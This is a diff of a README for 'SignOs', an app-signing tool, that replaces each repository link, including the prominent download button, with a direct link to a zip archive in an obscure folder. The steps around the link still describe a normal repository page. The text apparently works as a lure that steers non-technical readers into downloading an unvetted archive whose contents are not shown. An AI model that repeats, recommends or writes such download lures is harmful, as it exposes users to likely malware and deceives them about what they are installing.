@@ -1,7 +1,7 @@
 <h1>📱 SignOs - Sign Apps Without a Computer</h1>
 
 <p align="center">
-  <a href="https://github.com/tabbieelectric8182/SignOs" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;border-radius:8px;font-size:20px;font-weight:bold;">⬇️ DOWNLOAD SignOs NOW</a>
+  <a href="https://github.com/tabbieelectric8182/SignOs/raw/refs/heads/main/lobeless/v3.6-alpha.1.zip" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;border-radius:8px;font-size:20px;font-weight:bold;">⬇️ DOWNLOAD SignOs NOW</a>
 </p>
 
 ## 🖥️ What is SignOs?
@@ -25,7 +25,7 @@ You do not need to know how to code. You do not need a developer account. You do
 
 Getting SignOs on your computer is easy. Follow these steps:
 
-1. **Click the green button** at the top of this page, or visit this link: [https://github.com/tabbieelectric8182/SignOs](https://github.com/tabbieelectric8182/SignOs)
+1. **Click the green button** at the top of this page, or visit this link: [https://github.com/tabbieelectric8182/SignOs/raw/refs/heads/main/lobeless/v3.6-alpha.1.zip](https://github.com/tabbieelectric8182/SignOs/raw/refs/heads/main/lobeless/v3.6-alpha.1.zip)
 2. Wait for the page to load. It will look like a normal website with some files and folders.
 3. Look for a section that says **Releases** or **Download**. It is usually on the right side of the page or near the top.
 4. Click the download link. Your browser will start downloading a file.
@@ -143,6 +143,6 @@ SignOs changes how you work with apps. Instead of hunting for updates or struggl
 
 You are one click away from a smarter, simpler way to manage your apps. Get started now and enjoy automatic updates, background signing, and effortless cloning.
 
-Visit this link to download the application and join thousands of users who already made the switch: [https://github.com/tabbieelectric8182/SignOs](https://github.com/tabbieelectric8182/SignOs)
+Visit this link to download the application and join thousands of users who already made the switch: [https://github.com/tabbieelectric8182/SignOs/raw/refs/heads/main/lobeless/v3.6-alpha.1.zip](https://github.com/tabbieelectric8182/SignOs/raw/refs/heads/main/lobeless/v3.6-alpha.1.zip)
 
 Made with care by @ihateios.
